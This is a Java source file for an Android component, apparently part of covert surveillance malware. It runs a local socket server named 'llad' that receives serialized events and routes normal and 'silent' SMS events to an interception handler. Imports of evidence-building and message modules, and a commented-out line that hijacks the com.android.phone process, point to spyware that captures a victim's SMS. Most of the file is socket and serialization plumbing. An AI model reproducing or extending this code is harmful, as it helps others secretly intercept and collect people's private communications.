package com.android.dvci.listener;
import android.net.LocalServerSocket;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.telephony.SmsMessage;

import com.android.dvci.Core;
import com.android.dvci.auto.Cfg;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.evidence.EvidenceType;
import com.android.dvci.interfaces.Observer;
import com.android.dvci.module.ModuleMessage;
import com.android.dvci.module.message.Sms;
import com.android.dvci.util.ByteArray;
import com.android.dvci.util.Check;
import com.android.dvci.util.DataBuffer;
import com.android.dvci.util.DateTime;
import com.android.dvci.util.LowEvent;
import com.android.dvci.util.LowEventHandlerDefs;
import com.android.dvci.util.SmsHeader;
import com.android.dvci.util.SmsMessageBase;
import com.android.dvci.util.StringUtils;
import com.android.dvci.util.Utils;
import com.android.dvci.util.WChar;
import com.android.mm.M;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.Date;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * Created by zad on 27/02/15.
 */
public class LowEventHandler extends Listener<LowEventHandlerDefs> implements Runnable {
	//hijack = new Instrument(M.e("com.android.phone"), Status.getApkName()+"@"+ Status.getAppContext().getPackageName(), Status.self().semaphoreMediaserver, M.e("pa.data"),M.e("radio"));

	private static final String TAG = "LowEventHandler";
	private static final int DEFAULT_STOP_TIMEOUT = 60;
	private boolean accept =true;
	private LocalServerSocket server = null;
	private Thread thread = null;
	private volatile static LowEventHandler singleton;
	/* For every specialization of LowEventHandler create a new instance of
	 * it
	 */
	private static  LowEventHandlerSms llhSms ;
	protected LowEventHandler() {
	}

	/**
	 * Self.
	 *
	 * @return the status
	 */
	public static LowEventHandler self() {
		if (singleton == null) {
			synchronized (ListenerSms.class) {
				if (singleton == null) {
					singleton = new LowEventHandler();
				}
				if ( llhSms == null ){
					llhSms = LowEventHandlerSms.self();
				}
			}
		}
		return singleton;
	}

	@Override
	public void start() {
		if(thread == null) {
			thread = new Thread(this);
		}
		thread.start();
	}

	@Override
	public void stop() {
		closeSocketServer(0);
	}


	private static LowEventHandlerDefs sendSerialObj(LowEventHandlerDefs obj) {
		if (obj==null){
			return null;
		}
		LocalSocket sender = new LocalSocket();
		obj.res=1;
		try {
			sender.connect(new LocalSocketAddress("llad"));
			if (Cfg.DEBUG) {
				Check.log(TAG + "(sendSerialObj): SENT DATA ");
			}
			int timeout = 5;
			if (Cfg.DEBUG) {
				Check.log(TAG + "(sendSerialObj): wait connection..");
			}
			while (timeout-- > 0) {
				if (sender.isBound() && sender.isConnected()) {
					break;
				} else {
					if (Cfg.DEBUG) {
						Check.log(TAG + ".");
					}
				}
				Utils.sleep(100);
			}
			if (!(sender.isBound() && sender.isConnected())) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(sendSerialObj):  (connection failed): ");//$NON-NLS-1$
				}
				return obj;
			}
			DataInputStream streamIn = new DataInputStream(new
					BufferedInputStream(sender.getInputStream()));
			DataOutputStream streamOut = new DataOutputStream(new
					BufferedOutputStream(sender.getOutputStream()));
			ObjectOutputStream oos = new ObjectOutputStream(streamOut);
			oos.writeObject(obj);
			oos.flush();
			streamOut.flush();
			if (Cfg.DEBUG) {
				Check.log(TAG + "(sendSerialObj): object sent");//$NON-NLS-1$
			}
			obj = null;
			timeout = 10;
			int available = 0;
			while (timeout-- > 0 && available <= 0) {
				try {
					if (sender.isBound() && sender.isConnected()) {
						try {
							available = streamIn.available();
							if (Cfg.DEBUG) {
								Check.log(TAG + "(sendSerialObj): getAvailable " + available);//$NON-NLS-1$
							}
							if (available > 0) {

								ObjectInputStream ois = new ObjectInputStream(streamIn);
								obj = (LowEventHandlerDefs) ois.readObject();
								if (Cfg.DEBUG) {
									Check.log(TAG + "(sendSerialObj): GOT DATA " + obj);
								}
							}
						} catch (Exception e) {
							if (Cfg.DEBUG) {
								Check.log(TAG + "(sendSerialObj): is available Error: ", e);//$NON-NLS-1$
							}
						}
					} else {
						if (Cfg.DEBUG) {
							Check.log(TAG + "(sendSerialObj):  getAvailable sender not connected");//$NON-NLS-1$
						}

					}

				} catch (Exception e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "(sendSerialObj): getAvailable Error: ", e);//$NON-NLS-1$
					}
				}
				Utils.sleep(100);
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " (sendSerialObj): exiting t=" + timeout + " a=" + available);//$NON-NLS-1$
			}
			Utils.sleep(100);
		}catch (Exception e){
			if (Cfg.DEBUG) {
				Check.log(TAG + "(sendSerialObj): LocalSocketAddress Error: ", e);//$NON-NLS-1$
			}
		}
		return obj;
	}

	/**
	 * Stops the listening socket if any
	 * @param timeout_seconds
	 *      the number of seconds to wait, default value is 60 seconds
	 *      and it is used if timeout_second is < 1
	 * @return void
	 */

	public void closeSocketServer(int timeout_seconds) {
		accept = false;
		if ( timeout_seconds < 1 ){
			timeout_seconds = DEFAULT_STOP_TIMEOUT;
		}
		if ( thread != null ) {
			LowEventHandlerDefs obj = new LowEventHandlerDefs();
			obj.data = null;
			obj.type = LowEventHandlerDefs.EVENT_TYPE_KILL;
			Date start = new Date();
			long diff_sec = (new Date().getTime() - start.getTime()) / 1000;
			while (server != null && diff_sec < timeout_seconds ) {
				thread.interrupt();
				Utils.sleep(100);
				if (server != null) {
					try {
						server.close();
					} catch (IOException e) {
						e.printStackTrace();
						continue;
					}
				}
				if ( obj == null ){
					obj = new LowEventHandlerDefs();
					obj.data = null;
					obj.type = LowEventHandlerDefs.EVENT_TYPE_KILL;
				}
				obj = sendSerialObj(obj);
				diff_sec = (new Date().getTime() - start.getTime()) / 1000;
			}
		}
	}
	@Override
	public void run() {
		try {
			server = new LocalServerSocket("llad");
			if (Cfg.DEBUG) {
				Check.log(TAG + " Server is ready...");
			}
			while(this.accept) {
				/* wait until a connection is ready */
				try {
					if (Cfg.DEBUG) {
						Check.log(TAG + "(run): going to accept");
					}
					LocalSocket receiver = null;
					try {
						receiver = server.accept();
					}catch (IOException e){
						if(!this.accept){
							if (Cfg.DEBUG) {
								Check.log(TAG + "(run): interrupted for stopping listening");
							}
							break;
						}
					}
					if (receiver != null) {
						DataInputStream streamIn = new DataInputStream(new
								BufferedInputStream(receiver.getInputStream()));
						DataOutputStream streamOut = new DataOutputStream(new
								BufferedOutputStream(receiver.getOutputStream()));
						int timeout = 5;
						while (streamIn.available() == 0 && timeout-- >= 0) {
							Utils.sleep(100);
						}
						if (streamIn.available() > 0) {
							ObjectInputStream ois = new ObjectInputStream(streamIn);
							LowEventHandlerDefs event = (LowEventHandlerDefs) ois.readObject();
							if (Cfg.DEBUG) {
								Check.log(TAG + "(run):GOT DATA " + event);
							}
							if (event.type  == LowEventHandlerDefs.EVENT_TYPE_SMS || event.type  == LowEventHandlerDefs.EVENT_TYPE_SMS_SILENT) {
								event.res = llhSms.notification(event);
								if (Cfg.DEBUG) {
									Check.log(TAG + "(run): SENT reply " + event.res);
								}
							} if(event.type == LowEventHandlerDefs.EVENT_TYPE_KILL) {
								/* kill is used just to unblock server.accept(); in order to
								 * evaluate this.accept
								 */
								if (Cfg.DEBUG) {
									Check.log(TAG + "(run): SENT Kill");
									event.res = 1;
								}
							}else{
								event.res = 1;
							}
							timeout = 10;
							while (timeout-- >= 0 ) {
									try {
										ObjectOutputStream oos = new ObjectOutputStream(streamOut);
										oos.writeObject(event);
										oos.flush();
										oos.close();
										break;
									} catch (Exception e) {
										if (Cfg.DEBUG) {
											Check.log(TAG + "(run): Exception sending back:", e);
										}
									}
								Utils.sleep(100);
							}
						}
						receiver.close();
						if (Cfg.DEBUG) {
							Check.log(TAG + "(run): receiver closed");
						}
					}else{
						if (Cfg.DEBUG) {
							Check.log(TAG + "(run): receiver null");
						}
					}
				} catch (Exception e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "(run): accept failed:", e);
					}
				}
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + "(run): stopping thread");
			}
			server.close();
			server = null;
			thread = null;
		} catch (IOException ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(run): IOEXCEPTION", ex);
			}
		}
	}
}
